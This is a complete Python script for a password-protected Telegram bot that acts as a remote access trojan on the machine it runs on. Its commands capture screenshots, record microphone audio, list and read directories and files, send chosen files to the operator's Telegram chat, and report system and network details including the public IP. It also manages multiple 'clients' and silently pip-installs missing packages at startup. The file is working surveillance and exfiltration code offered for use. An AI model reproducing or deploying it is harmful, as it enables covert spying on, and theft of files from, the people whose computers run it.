import logging
import os
import sys
import platform
import sounddevice as sd
from scipy.io.wavfile import write
import tempfile
from PIL import ImageGrab
import socket
import netifaces
import subprocess
import pkg_resources
import httpx
from dotenv import load_dotenv
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes, CallbackQueryHandler

# Verify all required packages
required_packages = ['Pillow', 'httpx', 'sounddevice', 'scipy', 'netifaces']

def check_and_install_packages(packages):
    installed_packages = {pkg.key for pkg in pkg_resources.working_set}
    missing_packages = [pkg for pkg in packages if pkg.lower() not in installed_packages]
    
    if missing_packages:
        print(f"Missing packages detected: {', '.join(missing_packages)}. Installing...")
        for package in missing_packages:
            subprocess.check_call([sys.executable, '-m', 'pip', 'install', package, '--break-system-packages'])
        print("All missing packages have been installed.")
    else:
        print("All required packages are already installed.")

# Check and install any missing packages before the rest of your script runs
check_and_install_packages(required_packages)

# Setup logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# Load environment variables
load_dotenv()

# Get token and password from environment variables
TOKEN = os.getenv('TOKENY')
PASSY = os.getenv('PASSY')

# Store connected clients and their authentication status
clients = {}

# Decorator to require authentication
def require_auth(func):
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        if user_id not in clients or not clients[user_id].get('authenticated', False):
            await update.message.reply_text("Please authenticate using the /login command first.")
            return
        return await func(update, context)
    return wrapper

# Command handlers
async def login(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    if not context.args:
        await update.message.reply_text("Usage: /login <password>")
        return
    if context.args[0] == PASSY:
        clients[user_id] = {'chat_id': update.effective_chat.id, 'selected_client': None, 'authenticated': True}
        await update.message.reply_text("Authentication successful.")
    else:
        await update.message.reply_text("Incorrect password.")

@require_auth
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    commands_menu = """
    /start - Show this menu
    /clients - Manage clients
    /info - System information
    /network - Network information
    /screenshot - Take a screenshot
    /record - Record audio
    /explore - Explore filesystem
    /getfile - Get a file
    """
    await context.bot.send_message(chat_id=update.effective_chat.id, text=commands_menu)

@require_auth
async def manage_clients(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    client_list = list(clients.keys())
    keyboard = [[InlineKeyboardButton(f"Client {i+1}", callback_data=f"select_client_{client}") for i, client in enumerate(client_list)]]
    keyboard.append([InlineKeyboardButton("Exit", callback_data="exit_client_selection")])
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text('Select a client:', reply_markup=reply_markup)

@require_auth
async def info(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    system_info = f"""
    System: {platform.system()}
    Username: {os.getlogin()}
    Node Name: {platform.node()}
    Release: {platform.release()}
    Version: {platform.version()}
    Machine: {platform.machine()}
    Processor: {platform.processor()}
    CPU Cores: {os.cpu_count()}
    """
    await context.bot.send_message(chat_id=update.effective_chat.id, text=system_info)

@require_auth
async def network(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    network_info = ""
    try:
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)
        async with httpx.AsyncClient() as client:
            response = await client.get('https://api.ipify.org?format=json')
            public_ip = response.json()['ip']
        for interface in netifaces.interfaces():
            if interface != 'lo':
                addrs = netifaces.ifaddresses(interface)
                if netifaces.AF_INET in addrs:
                    for addr in addrs[netifaces.AF_INET]:
                        network_info += f"Interface: {interface}\nIP: {addr['addr']}\nNetmask: {addr['netmask']}\n\n"
        network_info = f"Hostname: {hostname}\nLocal IP: {ip_address}\nPublic IP: {public_ip}\n\n{network_info}"
        await context.bot.send_message(chat_id=update.effective_chat.id, text=network_info)
    except Exception as e:
        logger.error(f"Error retrieving network information: {e}")

@require_auth
async def screenshot(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    screenshot_path = 'screenshot.png'
    try:
        screenshot = ImageGrab.grab()
        screenshot.save(screenshot_path)
        with open(screenshot_path, 'rb') as photo:
            await context.bot.send_photo(chat_id=update.effective_chat.id, photo=photo)
        os.remove(screenshot_path)
    except Exception as e:
        logger.error(f"Error taking or sending screenshot: {e}")
    finally:
        if os.path.exists(screenshot_path):
            try:
                os.remove(screenshot_path)
            except Exception as e:
                logger.error(f"Error deleting screenshot: {e}")

@require_auth
async def record(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    keyboard = [[InlineKeyboardButton("5 seconds", callback_data='5')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text('Choose recording duration:', reply_markup=reply_markup)

@require_auth
async def explore_filesystem(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not context.args:
        current_dir = os.getcwd()
        await list_directory(update, context, current_dir)
    else:
        command = context.args[0].lower()
        if command == 'cd' and len(context.args) > 1:
            new_dir = ' '.join(context.args[1:])
            await change_directory(update, context, new_dir)
        elif command == 'ls' and len(context.args) > 1:
            dir_to_list = ' '.join(context.args[1:])
            await list_directory(update, context, dir_to_list)
        elif command == 'cat' and len(context.args) > 1:
            file_to_read = ' '.join(context.args[1:])
            await read_file(update, context, file_to_read)
        else:
            await update.message.reply_text("Invalid command. Use 'cd', 'ls', or 'cat'.")

@require_auth
async def getfile(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not context.args:
        await update.message.reply_text("Usage: /sendfile <file_path>")
        return
    file_path = ' '.join(context.args)
    if not os.path.exists(file_path):
        await update.message.reply_text(f"File not found: {file_path}")
        return
    try:
        with open(file_path, 'rb') as file:
            await context.bot.send_document(chat_id=update.effective_chat.id, document=file)
    except Exception as e:
        logger.error(f"Error sending file: {e}")
        await update.message.reply_text(f"Error sending file: {str(e)}")

# Utility functions
async def button(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    await query.answer()
    user_id = update.effective_user.id
    if query.data.startswith("select_client_"):
        selected_client = int(query.data.split("_")[-1])
        clients[user_id]['selected_client'] = selected_client
        await query.edit_message_text(f"Selected Client {selected_client}.")
    elif query.data == "exit_client_selection":
        clients[user_id]['selected_client'] = None
        await query.edit_message_text("Exited client selection.")
    elif query.data.isdigit():
        duration = int(query.data)
        await record_audio(update, context, duration)

async def record_audio(update: Update, context: ContextTypes.DEFAULT_TYPE, duration: int) -> None:
    fs = 44100
    myrecording = sd.rec(int(duration * fs), samplerate=fs, channels=2)
    sd.wait()
    output_file = tempfile.mktemp(prefix="audio_", suffix=".wav", dir=None) 
    write(output_file, fs, myrecording)
    await context.bot.send_audio(chat_id=update.effective_chat.id, audio=open(output_file, 'rb'))
    os.remove(output_file)

async def list_directory(update: Update, context: ContextTypes.DEFAULT_TYPE, path: str) -> None:
    try:
        items = os.listdir(path)
        message = f"Contents of {path}:\n\n"
        for item in items:
            full_path = os.path.join(path, item)
            if os.path.isdir(full_path):
                message += f"📁 {item}/\n"
            else:
                message += f"📄 {item}\n"
        await update.message.reply_text(message)
    except Exception as e:
        await update.message.reply_text(f"Error listing directory: {str(e)}")

async def change_directory(update: Update, context: ContextTypes.DEFAULT_TYPE, new_dir: str) -> None:
    try:
        os.chdir(new_dir)
        current_dir = os.getcwd()
        await update.message.reply_text(f"Changed directory to: {current_dir}")
        await list_directory(update, context, current_dir)
    except Exception as e:
        await update.message.reply_text(f"Error changing directory: {str(e)}")

async def read_file(update: Update, context: ContextTypes.DEFAULT_TYPE, file_path: str) -> None:
    try:
        with open(file_path, 'r') as file:
            content = file.read(4000)  # Read first 4000 characters
        if len(content) == 4000:
            content += "\n... (file truncated)"
        await update.message.reply_text(f"Contents of {file_path}:\n\n{content}")
    except Exception as e:
        await update.message.reply_text(f"Error reading file: {str(e)}")

async def error(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    logger.warning('Update "%s" caused error "%s"', update, context.error)

def validate_token(token: str) -> bool:
    return token and isinstance(token, str) and len(token.split(':')) == 2

def main():
    if not validate_token(TOKEN):
        logger.error("Bot token validation failed. Exiting...")
        sys.exit(1)
    if not PASSY:
        logger.error("Bot password not set. Exiting...")
        sys.exit(1)

    application = Application.builder().token(TOKEN).build()

    application.add_handler(CommandHandler("login", login))
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("clients", manage_clients))
    application.add_handler(CommandHandler("info", info))
    application.add_handler(CommandHandler("network", network))
    application.add_handler(CommandHandler("screenshot", screenshot))
    application.add_handler(CommandHandler("record", record))
    application.add_handler(CommandHandler("explore", explore_filesystem))
    application.add_handler(CommandHandler("getfile", getfile))
    application.add_handler(CallbackQueryHandler(button))

    application.add_error_handler(error)

    application.run_polling()

if __name__ == '__main__':
    main()